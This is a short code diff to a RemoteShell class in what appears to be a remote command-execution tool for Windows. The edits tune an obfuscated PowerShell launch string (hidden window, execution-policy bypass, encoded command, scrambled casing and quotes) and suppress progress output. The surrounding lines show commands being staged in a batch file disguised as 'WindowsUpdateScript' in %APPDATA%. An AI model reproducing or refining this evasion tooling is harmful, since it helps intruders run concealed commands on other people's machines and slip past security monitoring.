@@ -182,7 +182,7 @@ class RemoteShell(cmd.Cmd):
         self.__command = ''
         self.__shell = 'cmd.exe ;"/"Q "@" ,/c '
         self.__shell_type = shell_type
-        self.__pwsh = 'POWeRShELl.exe ―N"o"pRo -N"o"Lo -St -"n"onI"NTER"a"C" -w Hi"dd"en —E"XEc"ut B"y"p"a"s"s" —En"co"deD"COM" '
+        self.__pwsh = 'POWeRShELl.exe -N"o"pRo -N"o"Lo -St -"n"onI"NTER"a"C" /w Hi"dd"en -E"XEc"ut B"y"p"a"s"s" -En"co"deD"COM" '
         self.__serviceName = serviceName
         self.__rpc = rpc
         self.intro = '[!] Launching semi-interactive shell - Careful what you execute'
@@ -278,7 +278,7 @@ class RemoteShell(cmd.Cmd):
 
     def execute_remote(self, data, shell_type='cmd'):
         if shell_type == 'powershell':
-            data = '$ProgressPreference="Continue";' + data
+            data = '$ProgressPreference="Ignore";' + data
             data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
 
         batchFile = '%APPDATA%\\' + 'WindowsUpdateScript' + ''.join([random.choice(string.ascii_letters) for _ in range(2)]) + '.cmd'
